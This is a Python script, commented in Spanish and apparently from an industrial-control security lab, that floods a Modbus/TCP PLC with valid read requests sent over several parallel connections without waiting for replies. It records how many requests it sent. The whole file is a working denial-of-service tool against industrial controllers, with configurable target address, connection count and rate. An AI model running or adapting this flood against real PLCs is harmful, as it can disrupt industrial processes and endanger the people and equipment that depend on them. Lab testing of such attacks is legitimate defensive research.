#!/usr/bin/env python3
"""Ataque Modbus/TCP flood: solicitudes Modbus VÁLIDAS (función 3) enviadas sin esperar respuesta,
sobre varias conexiones TCP, durante --seconds. Corre en lab-attacker. Solo biblioteca estándar.

Cada conexión envía ráfagas de --burst solicitudes y lee lo que haya llegado sin bloquear,
para que el receptor no se llene. Escribe al final un JSON con lo enviado realmente
(no es una estimación: cuenta cada solicitud escrita en el socket).

Comando usado en el laboratorio (obs. 22):
  modbus_flood.py --plc 192.168.30.10 --conns 8 --seconds 60 --out flood.json
"""
import argparse, json, os, selectors, socket, struct, sys, time

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--plc", default="192.168.30.10")
    ap.add_argument("--port", type=int, default=502)
    ap.add_argument("--conns", type=int, default=8)
    ap.add_argument("--burst", type=int, default=32)
    ap.add_argument("--seconds", type=float, required=True)
    ap.add_argument("--rate", type=float, default=0, help="solicitudes/s totales; 0 = lo más rápido posible")
    ap.add_argument("--out", required=True)
    a = ap.parse_args()

    sel = selectors.DefaultSelector()
    socks, tx = [], 0
    stats = {"sent_requests": 0, "sent_bytes": 0, "recv_bytes": 0, "connect_ok": 0,
             "connect_fail": 0, "socket_errors": 0, "reconnects": 0}

    def open_conn():
        try:
            s = socket.create_connection((a.plc, a.port), timeout=1.0)
            s.setblocking(False)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sel.register(s, selectors.EVENT_READ | selectors.EVENT_WRITE)
            stats["connect_ok"] += 1
            return s
        except OSError:
            stats["connect_fail"] += 1
            return None

    t_start = time.monotonic()
    t_end = t_start + a.seconds
    for _ in range(a.conns):
        s = open_conn()
        if s: socks.append(s)
    interval = (a.burst / a.rate) if a.rate > 0 else 0
    next_send = time.monotonic()
    while time.monotonic() < t_end:
        if not socks:
            s = open_conn()
            if s: socks.append(s); stats["reconnects"] += 1
            else: time.sleep(0.05)
            continue
        for key, ev in sel.select(timeout=0.01):
            s = key.fileobj
            try:
                if ev & selectors.EVENT_READ:
                    d = s.recv(65536)
                    if not d: raise ConnectionError()
                    stats["recv_bytes"] += len(d)
                if ev & selectors.EVENT_WRITE and time.monotonic() >= next_send:
                    frames = []
                    for _ in range(a.burst):
                        tx = (tx + 1) & 0xFFFF
                        frames.append(struct.pack(">HHHBBHH", tx, 0, 6, 1, 3, 0, 4))
                    data = b"".join(frames)
                    n = s.send(data)
                    stats["sent_bytes"] += n
                    stats["sent_requests"] += n // 12  # solo solicitudes completas escritas
                    if interval: next_send += interval
            except (BlockingIOError, InterruptedError):
                pass
            except (ConnectionError, OSError):
                stats["socket_errors"] += 1
                sel.unregister(s); s.close(); socks.remove(s)
    dur = time.monotonic() - t_start
    for s in socks:
        try: s.close()
        except OSError: pass
    stats.update({"duration_s": round(dur, 3), "conns": a.conns, "burst": a.burst, "rate_target": a.rate,
                  "requests_per_s": round(stats["sent_requests"] / dur, 1) if dur else 0,
                  "cmd": " ".join(sys.argv)})
    with open(a.out, "w") as f:
        json.dump(stats, f, indent=1)
    print(json.dumps(stats))
    return 0

if __name__ == "__main__":
    sys.exit(main())
